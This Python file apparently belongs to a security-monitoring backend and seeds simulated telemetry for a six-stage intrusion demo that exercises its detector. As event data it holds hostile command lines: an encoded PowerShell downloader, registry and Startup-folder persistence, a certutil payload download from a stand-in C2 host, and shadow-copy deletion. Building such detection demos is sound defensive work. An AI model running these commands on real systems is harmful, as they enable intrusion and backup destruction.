"""
Agni (अग्नि) - Sample Intrusion Scenario Generator
File: backend/app/engine/sample_generator.py
"""

from __future__ import annotations

import logging
from datetime import UTC, datetime, timedelta
from typing import Any
from uuid import uuid4

from sqlalchemy.orm import Session

from app.engine.correlator import IncidentCorrelator
from app.engine.detector import Detector
from app.models.event import TelemetryEventModel
from app.models.incident import DetectionAlertModel, IncidentModel, IncidentNoteModel
from app.models.network import NetworkDeviceModel

logger = logging.getLogger("agni.engine.sample_generator")


class SampleDataGenerator:
    """Generates and manages isolated demo data simulating the Operation Ignis Vector APT scenario."""

    def __init__(self, detector: Detector, correlator: IncidentCorrelator):
        self.detector = detector
        self.correlator = correlator

    def seed_scenario(self, db: Session, target_hostname: str = "DharmaCipher") -> dict[str, Any]:
        """
        Injects the complete 6-stage Operation Ignis Vector scenario.
        Runs telemetry through the Detector and Correlator so that genuine,
        interlinked alerts and incidents are created.
        """
        self.clear_sample_data(db)

        base_time = datetime.now(UTC) - timedelta(minutes=15)
        events: list[TelemetryEventModel] = []

        # ---------------------------------------------------------------------
        # 0. Sample Network Devices
        # ---------------------------------------------------------------------
        devices = [
            NetworkDeviceModel(
                id=str(uuid4()),
                ip_address="192.168.1.1",
                mac_address="00:1a:2b:3c:4d:5e",
                hostname="gateway.local",
                vendor="Cisco Systems",
                interface_name="eth0",
                is_gateway=True,
                first_seen=base_time - timedelta(days=7),
                last_seen=base_time,
                active_connections_count=12,
                is_sample=True,
            ),
            NetworkDeviceModel(
                id=str(uuid4()),
                ip_address="192.168.1.100",
                mac_address="52:54:00:12:34:56",
                hostname="DC-PRIMARY",
                vendor="VMware",
                interface_name="eth0",
                is_gateway=False,
                first_seen=base_time - timedelta(days=5),
                last_seen=base_time,
                active_connections_count=8,
                is_sample=True,
            ),
            NetworkDeviceModel(
                id=str(uuid4()),
                ip_address="192.168.1.105",
                mac_address="a4:83:e7:12:34:56",
                hostname=target_hostname,
                vendor="Intel Corporate",
                interface_name="Wi-Fi",
                is_gateway=False,
                first_seen=base_time - timedelta(days=1),
                last_seen=base_time,
                active_connections_count=5,
                is_sample=True,
            ),
            NetworkDeviceModel(
                id=str(uuid4()),
                ip_address="192.168.1.205",
                mac_address="d8:50:e6:aa:bb:cc",
                hostname="unknown-kali",
                vendor="Raspberry Pi",
                interface_name="eth0",
                is_gateway=False,
                first_seen=base_time - timedelta(minutes=20),
                last_seen=base_time,
                active_connections_count=2,
                is_sample=True,
            ),
        ]
        db.add_all(devices)
        db.commit()

        # ---------------------------------------------------------------------
        # Stage 1: Initial Execution
        # ---------------------------------------------------------------------
        t1 = base_time + timedelta(seconds=10)
        e1 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t1,
            event_version="1.0.0",
            category="process",
            action="spawned",
            severity="High",
            source="agni_core",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=4210,
            actor_name="quarterly_report.pdf.exe",
            actor_path=r"C:\Users\Analyst\Downloads\quarterly_report.pdf.exe",
            actor_cmdline=r'"C:\Users\Analyst\Downloads\quarterly_report.pdf.exe"',
            actor_user=r"DharmaCipher\Analyst",
            target_type="process",
            target_identifier="quarterly_report.pdf.exe",
            target_details={"double_extension": True},
            details={"parent_name": "explorer.exe"},
            is_sample=True,
        )
        events.append(e1)

        t2 = base_time + timedelta(seconds=25)
        e2 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t2,
            event_version="1.0.0",
            category="process",
            action="spawned",
            severity="High",
            source="agni_core",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=4350,
            actor_name="powershell.exe",
            actor_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            actor_cmdline=r"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
            actor_user=r"DharmaCipher\Analyst",
            target_type="process",
            target_identifier="powershell.exe",
            target_details={"encoded_command": True},
            details={"parent_name": "quarterly_report.pdf.exe"},
            is_sample=True,
        )
        events.append(e2)

        # ---------------------------------------------------------------------
        # Stage 2: Defense Evasion & Staging
        # ---------------------------------------------------------------------
        t3 = base_time + timedelta(seconds=75)
        e3 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t3,
            event_version="1.0.0",
            category="process",
            action="spawned",
            severity="Medium",
            source="agni_core",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=5120,
            actor_name="update_svc.exe",
            actor_path=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_cmdline=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe --daemon",
            actor_user=r"DharmaCipher\Analyst",
            target_type="process",
            target_identifier="update_svc.exe",
            target_details={"temp_staged": True},
            details={"parent_name": "powershell.exe"},
            is_sample=True,
        )
        events.append(e3)

        # ---------------------------------------------------------------------
        # Stage 3: Persistence Installation
        # ---------------------------------------------------------------------
        t4 = base_time + timedelta(seconds=120)
        e4 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t4,
            event_version="1.0.0",
            category="persistence",
            action="created",
            severity="High",
            source="persistence",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=5120,
            actor_name="update_svc.exe",
            actor_path=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_cmdline=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_user=r"DharmaCipher\Analyst",
            target_type="reg_key",
            target_identifier=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck",
            target_details={"value": r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe"},
            details={"registry_hive": "HKCU"},
            is_sample=True,
        )
        events.append(e4)

        t5 = base_time + timedelta(seconds=140)
        e5 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t5,
            event_version="1.0.0",
            category="persistence",
            action="created",
            severity="High",
            source="persistence",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=5120,
            actor_name="update_svc.exe",
            actor_path=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_cmdline=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_user=r"DharmaCipher\Analyst",
            target_type="file",
            target_identifier=r"C:\Users\Analyst\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SecurityUpdate.lnk",
            target_details={"shortcut_target": r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe"},
            details={"startup_folder": True},
            is_sample=True,
        )
        events.append(e5)

        # ---------------------------------------------------------------------
        # Stage 4: Situational Awareness Reconnaissance (Burst)
        # ---------------------------------------------------------------------
        recon_cmds = [
            ("whoami.exe", "whoami /all", 5201, 160),
            ("hostname.exe", "hostname", 5202, 163),
            ("net.exe", "net user Administrator", 5203, 167),
            ("ipconfig.exe", "ipconfig /all", 5204, 170),
        ]
        for name, cmd, pid, offset in recon_cmds:
            events.append(
                TelemetryEventModel(
                    id=str(uuid4()),
                    timestamp=base_time + timedelta(seconds=offset),
                    event_version="1.0.0",
                    category="process",
                    action="spawned",
                    severity="Low",
                    source="agni_core",
                    hostname=target_hostname,
                    os_name="Windows",
                    actor_pid=pid,
                    actor_name=name,
                    actor_path=f"C:\\Windows\\System32\\{name}",
                    actor_cmdline=cmd,
                    actor_user=r"DharmaCipher\Analyst",
                    target_type="process",
                    target_identifier=name,
                    target_details={},
                    details={"parent_name": "cmd.exe"},
                    is_sample=True,
                )
            )

        # ---------------------------------------------------------------------
        # Stage 5: Command & Control (C2)
        # ---------------------------------------------------------------------
        t6 = base_time + timedelta(seconds=240)
        e6 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t6,
            event_version="1.0.0",
            category="network",
            action="connected",
            severity="High",
            source="vayu",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=5120,
            actor_name="update_svc.exe",
            actor_path=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_cmdline=r"C:\Users\Analyst\AppData\Local\Temp\update_svc.exe",
            actor_user=r"DharmaCipher\Analyst",
            target_type="ip",
            target_identifier="198.51.100.44:4444",
            target_details={"remote_ip": "198.51.100.44", "remote_port": 4444},
            details={
                "remote_ip": "198.51.100.44",
                "remote_port": 4444,
                "local_port": 49812,
                "status": "ESTABLISHED",
                "protocol": "TCP",
            },
            is_sample=True,
        )
        events.append(e6)

        t7 = base_time + timedelta(seconds=280)
        e7 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t7,
            event_version="1.0.0",
            category="process",
            action="spawned",
            severity="High",
            source="agni_core",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=5890,
            actor_name="certutil.exe",
            actor_path=r"C:\Windows\System32\certutil.exe",
            actor_cmdline=r"certutil.exe -urlcache -split -f http://198.51.100.44/payload.bin C:\Users\Analyst\AppData\Local\Temp\payload.bin",
            actor_user=r"DharmaCipher\Analyst",
            target_type="process",
            target_identifier="certutil.exe",
            target_details={"url": "http://198.51.100.44/payload.bin"},
            details={"parent_name": "cmd.exe"},
            is_sample=True,
        )
        events.append(e7)

        # ---------------------------------------------------------------------
        # Stage 6: Ransomware / Impact Staging
        # ---------------------------------------------------------------------
        t8 = base_time + timedelta(seconds=350)
        e8 = TelemetryEventModel(
            id=str(uuid4()),
            timestamp=t8,
            event_version="1.0.0",
            category="process",
            action="spawned",
            severity="Critical",
            source="agni_core",
            hostname=target_hostname,
            os_name="Windows",
            actor_pid=6100,
            actor_name="vssadmin.exe",
            actor_path=r"C:\Windows\System32\vssadmin.exe",
            actor_cmdline=r"vssadmin.exe delete shadows /all /quiet",
            actor_user=r"DharmaCipher\Analyst",
            target_type="process",
            target_identifier="vssadmin.exe",
            target_details={"command": "delete shadows"},
            details={"parent_name": "cmd.exe"},
            is_sample=True,
        )
        events.append(e8)

        # Persist events and execute detection/correlation engine
        total_alerts = 0
        for ev in events:
            db.add(ev)
            db.commit()
            db.refresh(ev)
            emitted = self.detector.process_event(db, ev, correlator=self.correlator)
            total_alerts += len(emitted)

        # Add analyst triage note to the critical ransomware incident
        critical_incident = (
            db.query(IncidentModel)
            .filter(IncidentModel.rule_id == "AGNI-R-PROC-003", IncidentModel.is_sample.is_(True))
            .first()
        )
        if critical_incident:
            note = IncidentNoteModel(
                id=str(uuid4()),
                incident_id=critical_incident.id,
                author="Lead SOC Analyst",
                created_at=datetime.now(UTC),
                content="CONFIRMED ACTIVE THREAT: Shadow copy deletion intercepted. Host isolated from local subnet. Initiating memory dump analysis.",
            )
            db.add(note)
            critical_incident.status = "In Progress"
            critical_incident.priority = "P1_Critical"
            db.commit()

        status = self.get_sample_status(db)
        logger.info("Sample scenario seeded successfully: %s", status)
        return status

    def clear_sample_data(self, db: Session) -> dict[str, int]:
        """Safely cleanses all sample entities in foreign-key safe dependency order."""
        sample_incident_ids = [
            i[0] for i in db.query(IncidentModel.id).filter(IncidentModel.is_sample.is_(True)).all()
        ]
        notes_deleted = 0
        if sample_incident_ids:
            notes_deleted = (
                db.query(IncidentNoteModel)
                .filter(IncidentNoteModel.incident_id.in_(sample_incident_ids))
                .delete(synchronize_session=False)
            )

        alerts_deleted = 0
        if sample_incident_ids:
            alerts_deleted = (
                db.query(DetectionAlertModel)
                .filter(DetectionAlertModel.incident_id.in_(sample_incident_ids))
                .delete(synchronize_session=False)
            )

        incidents_deleted = (
            db.query(IncidentModel)
            .filter(IncidentModel.is_sample.is_(True))
            .delete(synchronize_session=False)
        )

        events_deleted = (
            db.query(TelemetryEventModel)
            .filter(TelemetryEventModel.is_sample.is_(True))
            .delete(synchronize_session=False)
        )

        devices_deleted = (
            db.query(NetworkDeviceModel)
            .filter(NetworkDeviceModel.is_sample.is_(True))
            .delete(synchronize_session=False)
        )

        db.commit()
        logger.info(
            "Purged sample data: %d events, %d incidents, %d alerts, %d devices",
            events_deleted, incidents_deleted, alerts_deleted, devices_deleted
        )
        return {
            "events_deleted": events_deleted,
            "incidents_deleted": incidents_deleted,
            "alerts_deleted": alerts_deleted,
            "notes_deleted": notes_deleted,
            "devices_deleted": devices_deleted,
        }

    def get_sample_status(self, db: Session) -> dict[str, Any]:
        """Returns statistics on active demo data in the database."""
        events_count = db.query(TelemetryEventModel).filter(TelemetryEventModel.is_sample.is_(True)).count()
        incidents_count = db.query(IncidentModel).filter(IncidentModel.is_sample.is_(True)).count()
        alerts_count = (
            db.query(DetectionAlertModel)
            .join(IncidentModel)
            .filter(IncidentModel.is_sample.is_(True))
            .count()
        )
        devices_count = db.query(NetworkDeviceModel).filter(NetworkDeviceModel.is_sample.is_(True)).count()

        return {
            "has_sample_data": (events_count > 0 or incidents_count > 0),
            "sample_events_count": events_count,
            "sample_incidents_count": incidents_count,
            "sample_alerts_count": alerts_count,
            "sample_devices_count": devices_count,
        }
